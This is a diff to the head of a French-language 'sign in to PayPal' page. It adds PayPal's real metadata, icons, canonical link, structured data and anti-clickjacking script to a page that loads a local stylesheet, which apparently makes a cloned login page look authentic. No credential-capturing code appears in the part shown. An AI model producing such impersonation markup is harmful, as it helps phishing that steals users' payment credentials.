@@ -4,7 +4,66 @@
   <meta charset="utf-8">
   <title>Connectez-vous à PayPal</title>
   <link rel="stylesheet" type="text/css" href="style.css">
-  <link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png"/>
+<meta name="application-name" content="PayPal"/>
+    <meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/fr/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/webstatic/icon/favicon.ico"/>
+    <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/fr/webapps/mpp/send-money-online;icon-uri=https://www.paypalobjects.com/webstatic/icon/favicon.ico"/>
+    <meta name="msapplication-task" content="name=Request Money;action-uri=https://www.paypal.com/fr/webapps/mpp/requesting-payments;icon-uri=https://www.paypalobjects.com/webstatic/icon/favicon.ico"/>
+    <meta name="keywords" content="paypal fr, transfert d'argent, paiement en ligne, solution paiement en ligne"/>
+    <meta name="description" content="Payez vos achats sans saisir vos coordonnées bancaires, recevez vos paiements en ligne et envoyez de l'argent de manière sécurisée avec PayPal."/>
+    <meta name="theme-color" content="#009cde"/>
+
+    <link rel="canonical" href="https://www.paypal.com/fr/webapps/mpp/account-sign-up"/>
+
+    <meta property="twitter:card" content="summary">
+    <meta property="twitter:site" content="@paypal">
+
+    <meta property="og:url" content="https://www.paypal.com/fr/webapps/mpp/account-sign-up"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:title" content="Paiements en ligne - Transferts d'argent | PayPal FR"/>
+    <meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png">
+    <meta property="og:description" content="Payez vos achats sans saisir vos coordonnées bancaires, recevez vos paiements en ligne et envoyez de l'argent de manière sécurisée avec PayPal."/>
+
+    <link rel="preload" as="font" type="font/woff2" crossOrigin href="https://www.paypalobjects.com/digitalassets/c/paypal-ui/fonts/PayPalSansSmall-Regular.woff2"/>
+    <link rel="preload" as="font" type="font/woff2" crossOrigin href="https://www.paypalobjects.com/digitalassets/c/paypal-ui/fonts/PayPalSansBig-Light.woff2"/>
+
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://www.paypalobjects.com/webstatic/icon/pp144.png"/>
+    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://www.paypalobjects.com/webstatic/icon/pp114.png"/>
+    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://www.paypalobjects.com/webstatic/icon/pp72.png"/>
+    <link rel="apple-touch-icon-precomposed" href="https://www.paypalobjects.com/webstatic/icon/pp64.png"/>
+    <link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png"/>
+    <link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico"/>
+    <link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png"/>
+
+    <link rel="dns-prefetch" href="https://www.paypalobjects.com">
+    <link rel="dns-prefetch" href="https://www.nexus.ensighten.com">
+    <link rel="dns-prefetch" href="https://www.google-analytics.com">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <script nonce="Dr+nCyF2VL483Ye/WwIjsJ8Sb7LhAqJH3SrHdkfbDhiV/bht" type="application/ld+json">
+      {
+      "@context": "http://schema.org/",
+      "@type": "Organization",
+      "url": "https://www.paypal.com/",
+      "logo": "https://www.paypalobjects.com/webstatic/i/logo/rebrand/ppcom.png"
+      }
+    </script>
+
+    <style id="antiClickjack">
+    html.js body {
+        display: none !important;
+    }
+    </style>
+    <script nonce="Dr+nCyF2VL483Ye/WwIjsJ8Sb7LhAqJH3SrHdkfbDhiV/bht">
+    if (self === top || /paypal\.com$/.test(window.parent.location.hostname)) {
+        var antiClickjack = document.getElementById("antiClickjack");
+        if (antiClickjack) {
+            antiClickjack.parentNode.removeChild(antiClickjack);
+        }
+    } else {
+        top.location = self.location;
+    }
+    </script>
 </head>
 <body>
 <div id="main" class="main " role="main">
